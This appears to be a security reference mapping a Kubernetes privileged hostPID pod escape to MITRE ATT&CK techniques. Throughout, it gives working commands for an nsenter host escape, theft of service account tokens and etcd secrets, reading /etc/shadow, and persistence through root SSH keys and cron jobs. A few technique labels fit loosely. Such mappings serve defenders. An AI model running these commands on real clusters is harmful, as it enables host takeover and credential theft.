# MITRE ATT&CK Mapping: Priv-and-HostPID Pod

## Attack Flow

```
Initial Access → Execution → Privilege Escalation → Credential Access → 
Discovery → Lateral Movement → Collection → Persistence
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f priv-and-hostpid-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it priv-and-hostpid-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands for post-exploitation

**Procedures:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
ps -ef | grep etcd
find / -name kubeconfig
```

---

### 3. Privilege Escalation

#### T1611 - Escape to Host  
**Behavior:** Break out of container using nsenter to access host init process (PID 1)

**Procedures:**
```bash
# Inside privileged pod with hostPID
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now running in host namespaces as root
```

**Pod Configuration:**
```yaml
spec:
  hostPID: true
  containers:
  - securityContext:
      privileged: true
```

**Why it works:**
- `privileged: true` - Breaks down container walls but PID namespace remains
- `hostPID: true` - Allows pod to see all host processes
- `nsenter` - Enters namespaces of PID 1 (init system) on host

---

### 4. Credential Access

#### T1552.001 - Unsecured Credentials: Credentials In Files
**Behavior:** Access credentials stored in files on host

**Service Account Tokens:**
```bash
# After nsenter to host
find /var/lib/kubelet/pods/ -name token -type l
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
```

**Kubeconfig Files:**
```bash
find / -name kubeconfig
find / -name .kube
grep -R "current-context" /home/
grep -R "current-context" /root/
```

**etcd Secrets (Control-Plane Node):**
```bash
strings /var/lib/etcd/member/snap/db | grep eyJhbGciOiJ

db=`strings /var/lib/etcd/member/snap/db`
for x in `echo "$db" | grep eyJhbGciOiJ`; do 
  name=`echo "$db" | grep $x -B40 | grep registry`
  echo $name \| $x
done
```

#### T1555 - Credentials from Password Stores
**Behavior:** Extract credentials from etcd database

**Procedures:**
```bash
strings /var/lib/etcd/member/snap/db
```

---

### 5. Discovery

#### T1613 - Container and Resource Discovery
**Behavior:** Enumerate Kubernetes resources and permissions

**Procedures:**
```bash
# List tokens with namespace
tokens=`find /var/lib/kubelet/pods/ -name token -type l`
for token in $tokens; do 
  parent_dir="$(dirname "$token")"
  namespace=`cat $parent_dir/namespace`
  echo $namespace "|" $token
done

# Using can-they.sh from outside pod
./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "get secrets -n kube-system"
./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "create pods -n kube-system"
```

#### T1082 - System Information Discovery
**Behavior:** Gather information about nodes and cluster

**Procedures:**
```bash
kubectl get nodes
ps -ef | grep etcd
```

#### T1083 - File and Directory Discovery
**Behavior:** Search for sensitive files on host

**Procedures:**
```bash
find / -name kubeconfig
find / -name .kube
grep -R "current-context" /home/
```

---

### 6. Lateral Movement

#### T1021.007 - Remote Services: Cloud Services
**Behavior:** Use stolen service account tokens to access Kubernetes API

**Procedures:**
```bash
# After token theft
kubectl --token=$STOLEN_TOKEN get secrets -n kube-system
kubectl --token=$STOLEN_TOKEN create pod malicious-pod -n kube-system
```

#### T1570 - Lateral Tool Transfer
**Behavior:** Transfer tools for enumeration

**Procedures:**
```bash
# can-they.sh used from outside the pod via kubectl exec
kubectl exec -it priv-and-hostpid-exec-pod -- find /var/lib/kubelet/pods/ -name token
```

---

### 7. Collection

#### T1005 - Data from Local System
**Behavior:** Access and collect data from host filesystem

**Procedures:**
```bash
strings /var/lib/etcd/member/snap/db
find /var/lib/kubelet/pods/ -name token
cat /etc/shadow
```

#### T1530 - Data from Cloud Storage Object
**Behavior:** Extract secrets from etcd

**Procedures:**
```bash
strings /var/lib/etcd/member/snap/db
```

---

### 8. Persistence

#### T1098 - Account Manipulation
**Behavior:** Add SSH keys for persistent access

**Procedures:**
```bash
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

#### T1053.003 - Scheduled Task/Job: Cron
**Behavior:** Add cron jobs on host

**Procedures:**
```bash
echo "*/5 * * * * /tmp/beacon.sh" >> /var/spool/cron/crontabs/root
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Privilege Escalation | T1611 | Escape to Host (nsenter) |
| Credential Access | T1552.001 | Credentials In Files |
| Credential Access | T1555 | Credentials from Password Stores |
| Discovery | T1613 | Container and Resource Discovery |
| Discovery | T1082 | System Information Discovery |
| Discovery | T1083 | File and Directory Discovery |
| Lateral Movement | T1021.007 | Cloud Services |
| Lateral Movement | T1570 | Lateral Tool Transfer |
| Collection | T1005 | Data from Local System |
| Collection | T1530 | Data from Cloud Storage |
| Persistence | T1098 | Account Manipulation |
| Persistence | T1053.003 | Cron |

**Total: 15 Techniques across 8 Tactics**
